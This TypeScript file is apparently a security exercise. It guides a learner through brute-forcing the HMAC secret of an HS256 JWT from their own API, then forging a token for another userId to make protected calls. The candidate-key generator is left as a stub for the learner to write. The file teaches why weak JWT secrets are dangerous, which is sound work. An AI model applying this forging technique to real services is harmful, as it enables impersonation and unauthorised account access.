import crypto from "crypto";

/**
 * 1st: generate a token on your API by doing a signin (check your cookies to find the token)
 */

/**
 * 2nd: use jwt.io to decode your token and copy/paste JSON information bellow (both header and payload)
 */
const header = {
  alg: "HS256",
  typ: "JWT",
};
const headerB64Url = Buffer.from(JSON.stringify(header)).toString("base64url");

const payload = {
  exp: 1715705567,
  userId: 4,
  iat: 1715698367,
};
const payloadB64Url = Buffer.from(JSON.stringify(payload)).toString(
  "base64url"
);

/**
 * 3rd: you may check that this log match the beginning of your JWT!
 */
console.log(`Token starts with: ${headerB64Url}.${payloadB64Url}`);

/**
 * 4th: it's your moment to shine! Wirte an algo to generate all possible string combination (from 1 to 4 chars for intance)
 */
// you should generate this! Good luck!
const potentialSecretKeys = ["a", "b", "c", "...", "sst!"];

let secretKey: string | undefined = undefined;

for (const potentialSecretKey of potentialSecretKeys) {
  console.log(`Testing ${potentialSecretKey}`);
  const hash = crypto
    .createHmac("sha256", potentialSecretKey)
    .update(`${headerB64Url}.${payloadB64Url}`)
    .digest("base64url");

  /**
   * 5th: replace this string with the signature part of your JWT
   */
  if (hash === "7t6J53lEhRcIUOgFxvR_kXZzd_eYdqeXna3dN0fD908") {
    console.log(`Bingo, secret key is ${potentialSecretKey}`);
    secretKey = potentialSecretKey;
    break;
  }
}

if (secretKey !== undefined) {
  const header = {
    alg: "HS256",
    typ: "JWT",
  };
  const headerB64Url = Buffer.from(JSON.stringify(header)).toString(
    "base64url"
  );

  /**
   * 6th: change the userId bellow to fake someone identity!
   */
  const payload = {
    exp: 1715705567,
    userId: 2,
    iat: 1715698367,
  };
  const payloadB64Url = Buffer.from(JSON.stringify(payload)).toString(
    "base64url"
  );

  const hash = crypto
    .createHmac("sha256", secretKey)
    .update(`${headerB64Url}.${payloadB64Url}`)
    .digest("base64url");

  /**
   * 7th: finally you may try to call your API by playing this forged token to make some pretected calls (use Postman for instance)
   */
  console.log(`Token is: ${headerB64Url}.${payloadB64Url}.${hash}`);
}
